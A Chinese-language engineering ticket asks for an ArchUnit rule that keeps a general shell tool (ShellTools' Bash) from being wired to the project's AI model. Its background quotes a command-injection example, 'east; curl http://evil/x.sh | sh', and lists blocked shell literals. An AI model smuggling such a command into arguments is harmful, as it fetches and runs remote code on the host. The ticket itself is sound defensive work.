# 01: 通用 shell 能力不得装给模型

**What to build:** 在 `BuildContractTest` 里加一条 ArchUnit 规则：`io.github.claw4j..` 不得依赖
`org.springaicommunity.agent.tools.ShellTools`。把"不装给模型"从注释里的一句话变成构建期的一道闸。

**Blocked by:** 无。

**Type:** task

**Demo:** 有人图省事写一个 `@Bean ShellTools shellTools()`，`./mvnw -o -pl claw4j-app test -Dtest=BuildContractTest`
立刻红，报错里点着 `ShellTools` 与 ADR-0002；删掉那个 bean 之后恢复绿。

## 背景

m2-08 把"起进程"从 shell 字符串收回到 argv（`ProcessRequest` 只有 `List<String> argv`），
票面给的例子是：模型给出 `east; curl http://evil/x.sh | sh`，走 shell 是两条命令，走 argv 只是
`--region` 的一个取值。挡住重犯的闸有两条，都在 `claw4j-app/src/test/java/io/github/claw4j/app/BuildContractTest.java`：

- `:83-89` `java_side_must_not_spawn_processes`：`io.github.claw4j..` 不得依赖 `java.lang.ProcessBuilder`，
  只放行 `LocalProcessRunner`。
- `:96-128` `noHandWrittenShellInvocations`：各模块主代码里不得出现
  `sh -c` / `bash -c` / `/bin/sh` / `/bin/bash` / `cmd.exe` 字面量。

**两条都拦不住"把现成的 shell 工具注册给模型"。** 通用 shell 能力今天就在我们自己的 classpath 上：

- `org.springaicommunity.agent.tools.ShellTools`（`spring-ai-agent-utils:0.13.0`，
  `claw4j-agent/pom.xml:43`、`claw4j-capability/pom.xml:51` 都直接依赖它）。
  它的三个工具是 `Bash` / `BashOutput` / `KillShell`（`@Tool(name=...)`，sources jar 实读），
  `Bash` 的参数是 `@ToolParam(description = "The command to execute") String command`——
  与 OpenClaw 的 `exec` 同一个接缝：一句话进去，一段脚本执行。
- 写一个 `@Bean ShellTools shellTools()` 不会触发上面任何一条：`ShellTools` 在 jar 里，
  我们不 `new ProcessBuilder`，也不写 `bash -c` 字面量。于是机器闸全绿，模型却拿到了 `Bash`。
- 这个类**不会被自动装配**：那个 jar 里只有 `META-INF/spring/aot.factories`，
  没有 `AutoConfiguration.imports`，没有 `spring.factories`。所以要装上它必须有人显式写一行——
  也就是说，"安装"这个动作是**可指认的**，一条依赖检查就能拦住。

今天全仓对 `ShellTools` 的引用是 **0**（`src/main` / `src/test` / `pom.xml` / `yml` 全扫）。
所以这条规则落地即绿：它守的是下一次，不是现在。

## 为什么要一条新规则，而不是扩两条现有的

`ProcessBuilder` 那条查的是**依赖**，shell 字面量那条查的是**源码文本**，两者都假设
"违规者自己拼命令"。而这次的违规形态是**引入一个别人写好的类**：既不拼命令也不造进程对象，
它只是出现在 `@Bean` 方法的返回类型上。同一个道理还能挡住另外两种形态
（`new ShellTools.Builder()`、把 `ShellTools` 当字段类型注入），所以规则只写一条依赖断言就够。

## 要做

1. 在 `BuildContractTest` 的「不起进程（ADR-0002）」那一节后面加一节，一条规则：

   ```java
   @ArchTest
   static final ArchRule no_general_shell_tool_wired_to_the_model =
           noClasses().that().resideInAPackage("io.github.claw4j..")
                   .should().dependOnClassesThat()
                   .haveFullyQualifiedName("org.springaicommunity.agent.tools.ShellTools")
                   .because("通用 shell 工具把模型的一句话变成一段脚本；脚本包走 argv（m2-08，ADR-0002）");
   ```

   名字与 `because` 都别省：这条规则是"要不要提供通用 shell 能力"这个**裁决**的唯一落点，
   写得含糊，下一个人会当成一条可以随手删的洁癖规则。

2. **先跑红，再验绿。** 做法：临时在 `claw4j-app` 的某个配置类里加

   ```java
   @Bean
   org.springaicommunity.agent.tools.ShellTools shellTools() {
       return org.springaicommunity.agent.tools.ShellTools.builder().build();
   }
   ```

   跑 `./mvnw -o -pl claw4j-app -am test -Dtest=BuildContractTest`，确认报错里点名 `ShellTools`；
   然后删掉这段。**把那行报错贴进 Comments**——没有这一步就等于没验证（`@ArchTest` 规则写错成
   永远匹配不上是很常见的，见 `:73-77` 那段注释踩过的坑）。

3. `docs/agents/guardrails.md` 加一行：通用 shell 工具是**有意不装**的，闸在
   `BuildContractTest#no_general_shell_tool_wired_to_the_model`，理由是 ADR-0002 / m2-08。
   那张表就是"已知偏差"的清单，这句话属于它。

## 验收判据

- [ ] 规则在 `BuildContractTest`，且**先红后绿**：临时加 `@Bean ShellTools` 时报错点名
      `ShellTools` 与 ADR-0002（报错行贴进 Comments）；删掉之后恢复绿。
- [ ] 规则真的能匹配：把 `haveFullyQualifiedName` 的类名改成 `...ShellTool`（少一个 s），
      同一次红必须变绿——用来证明这条红是我引进去的那一行造成的，不是别的原因。
- [ ] 全仓 `ShellTools` 引用仍为 0；`./scripts/verify.sh` 全绿、跳过 0、行覆盖率 ≥60%。
- [ ] 方法数不越上限：`BuildContractTest` 现在 11 个 `@Test` + 1 个 `@ArchTest`，
      加完是 11 + 2（`@ArchTest` 不是 `@Test`，但两样都算"方法"，离 20 还有余量）。
- [ ] `docs/agents/guardrails.md` 里查得到这条，理由指得到 ADR-0002。

## 不要做

- **不要顺手把 `spring-ai-agent-utils` 从 pom 里删掉。** 它同时还提供别的工具，删依赖是另一件事，
  而且"依赖在但不用"正是这道闸要表达的形态。
- **不要连 `ShellTools.Builder` / `ExecBackend` / `LocalExecBackend` 一起禁。** 只禁那一个类：
  禁太宽会让以后真正需要 `ExecBackend`（比如给脚本包换后端）时先要改规则，而那时的改动动机与现在无关。
- **不要顺便讨论"要不要给模型一个通用 exec"。** 那是独立一张票（见 `spec.md` 的"不做"），
  这张票只负责"装它必须先改这条规则"。
